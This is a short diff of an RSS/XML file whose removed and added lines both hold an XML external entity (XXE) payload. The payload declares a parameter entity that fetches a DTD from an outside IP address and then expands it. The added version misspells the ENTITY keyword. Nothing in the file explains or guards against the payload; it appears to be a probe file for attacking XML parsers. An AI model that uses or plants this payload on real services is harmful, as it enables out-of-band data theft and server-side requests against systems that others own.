@@ -1,9 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE foo [
-   <!ELEMENT foo ANY>
-   <!ENTITY % remote SYSTEM "http://35.180.29.78:80/c-tool-f/xxe_payload.xml">
-   %remote;
-   ]>
+<!DOCTYPE rss[
+  <!ENTITIY % dtd SYSTEM "http://35.180.29.78/c-tool-f/xxe_payload.xml"> %dtd;
+]>
 <rss version="2.0">
     <channel>
         <item>
